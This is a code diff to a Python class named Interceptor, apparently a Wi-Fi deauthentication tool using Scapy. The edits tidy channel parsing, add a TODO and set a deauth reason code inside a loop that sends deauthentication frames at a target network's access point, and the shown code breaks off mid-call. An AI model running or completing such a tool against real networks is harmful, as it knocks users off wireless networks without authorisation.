@@ -67,15 +67,8 @@ class Interceptor:
         self._current_channel_num = ch_num
 
     def _get_channels(self):
-        printf("ASdasd")
-        for channel in os.popen(f'iwlist {self.interface} channel').readlines():
-            if 'Channel' in channel:
-                x = channel.split('Channel')
-                print(x)
-                y = x[0].split(':')
-                print(y)
         return [int(channel.split('Channel')[1].split(':')[0].strip())
-                for channel in os.popen(f'iwlist {self.interface} channel').readlines() if 'Channel' in channel]
+                for channel in os.popen(f'iwlist {self.interface} channel').readlines() if 'Channel' in channel and 'Current' not in channel]
 
     def _printf_channel(self):
         printf(f"[*] Scanning for APs, current channel -> {self._current_channel_num}")
@@ -148,7 +141,7 @@ class Interceptor:
     def _clients_sniff_cb(self, pkt):
         try:
             if self._packet_confirms_client(pkt):
-            # if pkt.haslayer(Dot11Elt):
+            #if pkt.haslayer(Dot11Elt):
                 ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                 if ssid == self.target_ssid:
@@ -168,12 +161,13 @@ class Interceptor:
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)
     
     def _run_deauther(self):
+        # todo add exc hgandling and exit
         printf(f"[*] Starting de-auth loop...")
 
         ap_mac = [self._active_aps[self.target_ssid]["mac_addr"]]
 
         rd_frm = RadioTap()
-        deauth_frm = Dot11Deauth()
+        deauth_frm = Dot11Deauth(reason=7)
         while not self._abort:
             self.attack_loop_count += 1
             sendp(rd_frm /
